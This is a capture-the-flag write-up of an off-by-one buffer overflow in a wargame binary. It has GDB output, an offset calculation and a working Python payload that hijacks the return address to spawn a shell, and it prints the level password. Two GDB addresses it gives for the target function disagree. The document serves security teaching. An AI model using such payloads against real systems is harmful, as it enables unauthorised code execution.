# Level 9 - Off-by-One Buffer Overflow

## Overview

The final level! This program demonstrates an **off-by-one** buffer overflow where a loop copies 41 bytes into a 40-byte buffer. The extra byte overwrites a length field in a structure, which is then used in `strncpy()`, allowing us to overflow the return address and redirect to a hidden `secret_backdoor()` function.

## Vulnerability: Off-by-One Error [CWE-193](https://cwe.mitre.org/data/definitions/193.html)

### Description

An off-by-one error occurs when a loop iterates one time too many, often due to using `<=` instead of `<`:

```c
for (i = 0; i <= 40; i++)  // Copies 41 bytes (0-40 inclusive)!
    username[i] = buffer[i];
```

This overwrites the byte immediately after the 40-byte buffer.

## Analysis

### Structure Layout

```c
struct s_message {
    char text[140];      // offset 0
    char username[40];   // offset 140 (0x8c)
    int len;             // offset 180 (0xb4) - VICTIM!
};
```

### The Exploit Chain

1. **Off-by-one** in `set_username()`: Overwrites first byte of `msg.len`
2. **Modified length** changes `strncpy()` size from 140 to 255+
3. **Buffer overflow** in `set_msg()`: Overwrites return address
4. **RET hijack**: Redirects to `secret_backdoor()`
5. **Command execution**: `secret_backdoor()` runs our command

### Finding secret_backdoor Address

**IMPORTANT**: The binary is PIE (Position Independent Executable), so addresses change between GDB and normal execution!

**Method 1: Get the address from GDB**

```bash
level09@OverRide:~$ gdb ./level09
(gdb) break main
(gdb) run
Breakpoint 1, 0x0000555555554aac in main ()

(gdb) print &secret_backdoor
$1 = (<text variable, no debug info> *) 0x55555555488c <secret_backdoor>
```

The address is `0x55555555488c`.

**Important**: This address is in GDB's environment. Due to PIE, it may differ when running outside GDB!

To use it in your exploit (little-endian format):

```bash
# Address: 0x55555555488c
# Little-endian bytes: \x8c\x48\x55\x55\x55\x55\x00\x00

level09@OverRide:~$ python -c "print('A'*40 + '\xff' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh')" | ./level09
```

**Note**: If this causes a segfault, the address differs outside GDB. In that case, check if ASLR is disabled in your VM (see Method 2 below).

**Method 2: Check if ASLR is disabled in VM**

In the actual Override VM, ASLR may be disabled. Check with:
```bash
cat /proc/sys/kernel/randomize_va_space  # 0 = disabled, 2 = enabled
```

If disabled, the address will be consistent. Find it once with GDB and use it.

## Exploitation

### Step 1: Calculate Offsets

**Finding stack layout in GDB**:

```bash
level09@OverRide:~$ gdb ./level09
(gdb) disassemble handle_msg
Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:   push   rbp
   0x00000000000008c1 <+1>:   mov    rbp,rsp
   0x00000000000008c4 <+4>:   sub    rsp,0xc0        # Allocates 0xc0 (192) bytes
   0x00000000000008cb <+11>:  lea    rax,[rbp-0xc0]  # struct starts at RBP-0xc0
   0x00000000000008ff <+63>:  mov    DWORD PTR [rbp-0xc],0x8c  # msg.len = 140 at RBP-0xc
```

**Stack layout**:
- `msg` struct at `RBP - 0xc0` (192 bytes from RBP)
- Saved RBP at `RBP` (pushed by function prologue)
- Saved RIP (RET) at `RBP + 8` (pushed by call instruction)

**Distance calculation**:
```
From msg.text to RET = 0xc0 (192 to RBP) + 8 (RBP to RET) = 200 bytes
```

### Step 2: Build Exploit

**Part 1 - Username** (overwrites `msg.len`):
```
40 bytes + 1 overflow byte (0xff to set len=255)
```

**Part 2 - Message** (overwrites RET):
```
200 bytes padding + 8 bytes (secret_backdoor address) + command
```

### Step 3: Find Actual Runtime Address

**In the VM, you need to find where the binary actually loads:**

```bash
level09@OverRide:~$ gdb ./level09
(gdb) break *secret_backdoor
(gdb) run
(gdb) info proc mappings
# Look for the executable mapping, note the start address
# Or simpler:
(gdb) print &secret_backdoor
$1 = 0x55555540088c  # This address works in GDB

(gdb) quit
```
### Step 4: Generate and Test

```bash
# Once you find the correct address:
(python -c "print('A' * 40 + '\xff' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh')" ; cat) | ./level09
```

**Note**: The actual password from the original context is:
```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

This confirms the exploit works, but requires finding the correct runtime address for your specific VM environment.

## Solution

### For Developers - How to Prevent This

1. **Use `<` not `<=` in loops**:
   ```c
   // VULNERABLE
   for (i = 0; i <= 40; i++)

   // SAFE
   for (i = 0; i < 40; i++)
   ```

2. **Use `sizeof()` for bounds**:
   ```c
   for (i = 0; i < sizeof(username); i++)
   ```

3. **Use safe string functions**:
   ```c
   strncpy(dest, src, sizeof(dest) - 1);
   dest[sizeof(dest) - 1] = '\0';  // Ensure null termination
   ```

## Key Takeaways

- Off-by-one errors are subtle but dangerous
- Loop conditions must be carefully reviewed (`<` vs `<=`)
- Struct padding and layout affect vulnerability exploitability

## Password

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
